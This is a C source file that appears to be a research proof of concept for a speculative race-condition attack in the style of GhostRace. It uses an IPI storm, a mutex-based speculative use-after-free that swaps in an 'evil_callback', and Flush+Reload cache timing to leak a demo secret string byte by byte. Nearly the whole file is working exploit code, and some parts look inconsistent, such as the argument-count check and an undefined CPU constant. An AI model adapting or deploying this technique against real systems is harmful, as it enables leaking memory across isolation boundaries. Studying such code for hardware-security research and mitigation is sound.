#define _GNU_SOURCE
#include "utils/fr.h"
#include "utils/timer.h"
#include "utils/ipi.h"
#include <stdbool.h>
#include <string.h>
#define ATTACKER_CPU 1
#define L3_CACHE_LINE_SIZE 4096*4
#define THRESHOLD 250
#define NUM_THREADS 22

typedef void (*callback_t)(int* arg);
typedef struct victim_struct
{
    callback_t callback;
} victim_struct;
extern struct itimerspec spec;
victim_struct *v_st;
pthread_t victim;
pthread_mutex_t lock;
unsigned long timer_length;
unsigned long training_epochs;
char *SECRET = "This is the secret we will leak";
char buf[L3_CACHE_LINE_SIZE * 255 + 1]__attribute__((aligned(4096)));
volatile int ret __cacheline_aligned;
int freed = 0;
int finished = 0;
int LEAK_INDEX = 0;

int benign_callback(int* arg)
{
    return 0;
}

void evil_callback(char *c)
{
    char data = *c;
    buf[*c * L3_CACHE_LINE_SIZE] = 1;
}

void flush_buf()
{
    for (int j = 0; j < 255; j++)
        flush(&buf[j * L3_CACHE_LINE_SIZE]);
    flush(&lock);
}

void leak_secret(char *secret, int offset)
{
    ret = pthread_mutex_trylock(&lock);
    flush(&ret);
    if (likely(ret == 0))
    {
        v_st->callback(secret + offset);
        pthread_mutex_unlock(&lock);  
    }
}


void ipi_delay(unsigned long num_pid)
{
    //nanosleep(&spec, NULL);
    for (int i = 0; i < num_pid; i++)
        getpid();
}


char spectre_read(char *secret, int offset)
{
    char c = 0x0;
    flush_buf();

    leak_secret(secret, offset);

    for (int j = 0; j < 255; j++)
    {
        unsigned long timing;
        if ((timing = probe_timing(&buf[j * L3_CACHE_LINE_SIZE])) < THRESHOLD)
        {
            c = j;
            flush(&buf[j * L3_CACHE_LINE_SIZE]);
             //printf("Hit timing %d --> j == %c\n", timing, j);
            // printf("j: %d\n", j);
            break;
        }

            //printf("Miss timing %d\n", timing);
    }

    flush_buf();
    
    return c;
}
float victim_thread()
{
    pin_cpu(VICTIM_CPU);
    timer_start();
    
    clock_t start = clock();
    
    pthread_mutex_lock(&lock);
    // This free occurs in its own tcache
    //free(v_st);
    freed = 1;
    float j = 1;
    for (int i = 0; i < 2000000; i++)
    {
        j *= i;
    }

    pthread_mutex_unlock(&lock);
    clock_t end = clock();
    double time = (double)1e3 * (end - start) / CLOCKS_PER_SEC;
    //printf("Victim Thread Time: %7.2fms with timer resolution %ld\n", time, timer_length);
    finished = 1;
    return j;
}

void start_victim()
{   
    // This free would have been done in the same thread, and can be shown to collide every time
    //free(v_st);
    pthread_create(&victim, NULL, victim_thread, NULL);
}

void train_lock()
{
    unsigned long i;
    for (i = 0; i < training_epochs; i++)
    {
        pthread_mutex_lock(&lock);
        pthread_mutex_unlock(&lock);
    }
}

int main(int argc, char **argv)
{
    /*
        [ARGUMENTS]

        Arg1 --> timer length
        Arg2 --> lock training epochs
        Arg3 --> num getpid() to delay ipi storm

    */
    if (argc < 3)
    {
        printf("Expected: ghostrace timer_length training_epochs num_pid\n");
        exit(0);
    }
    timer_length = atol(argv[1]);
    training_epochs = atol(argv[2]);
    unsigned long num_pid = atol(argv[3]);

    printf("\n");
    for (;LEAK_INDEX < strlen(SECRET); LEAK_INDEX++)
    {
        /*
            Set up the victim structure
        */
        v_st = malloc(sizeof(victim_struct));
        v_st->callback = benign_callback;

        finished = 0;

        /*
            Other setup and initialization
        */
        int ret = pthread_mutex_init(&lock, NULL);
        assert(ret == 0);
        ipi_register(NUM_THREADS);
        timer_init(timer_length);
        pin_cpu(ATTACKER_CPU);
        memset(buf, 'x', sizeof(buf));
        flush_buf();
        train_lock();

        start_victim();


        ipi_delay(num_pid);


        begin_ipi_storm();

        if (!freed)
        {
            printf("not freed!\n");
            timer_cleanup();
            return;
        }

        /*
            GLIBC makes use of tcache(per thread caches), and this will prevent
            us from making our UAF work.

            This can be seen because we are allowed to do a double free(v_st)
            if it is done by different threads(i.e. victim and atacker).

            We would need to disable per thread caching to make the slab collision attack
            work in userspace.


            We can get this to work everytime however if we just do it here.
        */
        //printf("Attempting memory collision!\n");
        free(v_st);
        victim_struct *p;
        /*
            Memory allocation collision 
        */

        p = malloc(sizeof(victim_struct));
        p->callback = evil_callback;
        assert(p);
        
        

        if (v_st != p)
        {
            printf("UAF failed!\n");
            //timer_cleanup();
            return 2;
        }
        if (finished)
        {
            printf("Finished!\n");
            return 2;
            //timer_cleanup();
            //return 2;
        }
        //printf("UAF Succeeded!\n");

        printf("%c\n", spectre_read(SECRET, LEAK_INDEX));
        
        
        kill_ipi();
        timer_cleanup();
        float vret;
        pthread_join(victim, &vret);
        free(p);
    }
    printf("\n");
    
}